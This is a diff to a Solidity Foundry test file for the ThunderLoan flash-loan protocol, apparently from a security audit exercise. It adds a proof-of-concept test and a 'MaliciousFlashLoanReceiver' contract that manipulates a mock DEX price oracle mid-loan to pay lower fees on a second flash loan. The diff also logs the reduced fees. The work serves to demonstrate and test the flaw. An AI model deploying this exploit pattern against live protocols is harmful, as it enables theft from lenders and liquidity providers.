@@ -5,6 +5,12 @@ import { Test, console } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
+import { ERC20Mock } from "../mocks/ERC20Mock.sol";
+import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
+import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
+import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
+import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -107,5 +113,112 @@ contract ThunderLoanTest is BaseTest {
         //fee 0.3e18
         //amount expected to reddem => 1000.3e18; but get 1003e18
         vm.stopPrank();
+    }
+
+    function testPriceOracleManipulation() public {
+        thunderLoan = new ThunderLoan();
+        tokenA = new ERC20Mock();
+        proxy = new ERC1967Proxy(address(thunderLoan), "");
+        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
+        address tswapPool = pf.createPool(address(tokenA));
+        thunderLoan = ThunderLoan(address(proxy));
+        thunderLoan.initialize(address(pf));
+
+        // fund tswap
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, 100e18);
+        tokenA.approve(address(tswapPool), 1002e18);
+        weth.mint(liquidityProvider, 100e18);
+        weth.approve(address(tswapPool), 1002e18);
+        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
+        vm.stopPrank();
+
+        // fund flashLoan
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken((tokenA), true);
+        uint256 normalFees = thunderLoan.getCalculatedFee(tokenA, 100e18);
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, 1000e18);
+        tokenA.approve(address(thunderLoan), 1000e18);
+        thunderLoan.deposit(tokenA, 1000e18);
+        vm.stopPrank();
+        // 100 weth and 100tokenA in tswap
+        // 1000 tokenA in flashLoan
+        uint256 amountToBorrow = 50e18;
+        MaliciousFlashLoanReceiver mflr = new MaliciousFlashLoanReceiver(
+            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+        );
+        vm.startPrank(user);
+        tokenA.mint(address(mflr), 200e18); //for fees
+        thunderLoan.flashloan(address(mflr), IERC20(tokenA), amountToBorrow, "");
+        vm.stopPrank();
+
+        uint256 attackFees = mflr.feeOne() + mflr.feeTwo();
+
+        console.log("attack Fee", attackFees);
+        console.log("normalFees", normalFees);
+        console.log("mflr.feeOne()", mflr.feeOne());
+        console.log("mflr.feeTwo()", mflr.feeTwo());
+        assert(normalFees > attackFees);
+        //   attack Fee 214167600932190305
+        //   normalFees 296147410319118389
+        //   mflr.feeOne() 148073705159559194 => 1.48073705159559194e17
+        //   mflr.feeTwo() 66093895772631111 =>6.6093895772631111e16
+    }
+}
+
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    address repayAddress;
+    BuffMockTSwap tswapPool;
+    bool attacked;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    // 1. Swap TokenA borrowed for WETH
+    // 2. Take out a second flash loan to compare fees
+    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
+        tswapPool = BuffMockTSwap(_tswapPool);
+        thunderLoan = ThunderLoan(_thunderLoan);
+        repayAddress = _repayAddress;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        if (!attacked) {
+            feeOne = fee;
+            attacked = true;
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
+            IERC20(token).approve(address(tswapPool), 50e18);
+            // Tanks the price:
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
+            //second flash loan
+            //      address receiverAddress,
+            // IERC20 token,
+            // uint256 amount,
+            // bytes calldata params
+            // calling flash loan for 2nd time
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        } else {
+            // calculate the fee and repay
+            feeTwo = fee;
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            // since mutex lock in repay function
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        }
+        return true;
     }
 }
